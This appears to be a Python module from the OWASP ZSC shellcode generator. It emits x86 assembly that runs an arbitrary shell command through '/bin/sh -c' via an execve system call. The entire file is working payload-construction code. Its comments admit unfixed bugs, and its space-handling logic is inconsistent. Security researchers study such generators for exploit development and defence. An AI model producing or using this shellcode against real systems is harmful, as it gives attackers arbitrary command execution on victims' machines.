#!/usr/bin/env python
'''
OWASP ZSC
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp-zsc[at]googlegroups[dot]com ]
'''
from core import stack


def sys(command_to_execute):
    return """
%s
mov    %%esp,%%ecx
push   $0x632d9090
pop    %%edx
shr    $0x10,%%edx
push   %%edx
mov    %%esp,%%edx
push   $0x68732f90
pop    %%ebx
shr    $0x8,%%ebx
push   %%ebx
push   $0x6e69622f
mov    %%esp,%%ebx
xor    %%eax,%%eax
push   %%eax
push   %%ecx
push   %%edx
push   %%ebx
mov    %%esp,%%ecx
xor    %%edx,%%edx
push   %%edx
push   %%ecx
push   %%ebx
mov    $0x3b,%%al
push   $0x2a
int    $0x80
mov    $0x1,%%al
mov    $0x1,%%bl
int    $0x80
""" % command_to_execute


def run(data):
    command = data[0]
    if command.find(" ") >= 0:
        command = command.replace('[space]', ' ')
        if int(len(command)) < 5:
            command = str(
                command) + '[space]&&[space]echo[space]1[space]>[space]/dev/null'  # bypass a bug in here, fix later
        # bug in line 12 & 13, check later
        return sys(stack.generate(
            command.replace('[space]', ' '), '%ecx', 'string'))
    else:
        return sys(stack.generate(command, '%ecx', 'string'))
